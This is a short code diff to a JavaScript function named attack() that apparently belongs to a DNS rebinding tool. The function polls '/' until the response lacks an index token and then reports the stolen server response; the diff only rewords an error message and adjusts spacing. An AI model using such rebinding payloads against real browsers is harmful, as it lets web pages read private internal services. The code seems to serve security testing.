@@ -16,7 +16,7 @@ function attack() {
 	/* Send a GET request to '/' (the root web directory) to the IP address and
 	port defined in the manager UI. */
 	fetch('/')
-		.then(responseOKOrFail("Could not submit a request to get a list of keys"))
+		.then(responseOKOrFail("Could not fetch requested resource."))
 		.then(function (response) { // we successfully received the server response
 			if (response.includes(indextoken) == false && response.length > 0) {
 				clearInterval(timer); // stop the attack timer
@@ -24,7 +24,7 @@ function attack() {
 				// Terminate the attack:
 				// - display the response in a JavaScript alert()
 				// - write the response to the JavaScript console
-				attackSuccess("Server response: "+response);
+				attackSuccess("Server response: "+ response);
 			} else {
 				// We saw the token in the response. DNS Rebinding did not happen.
 				// Let's wait for the next time.
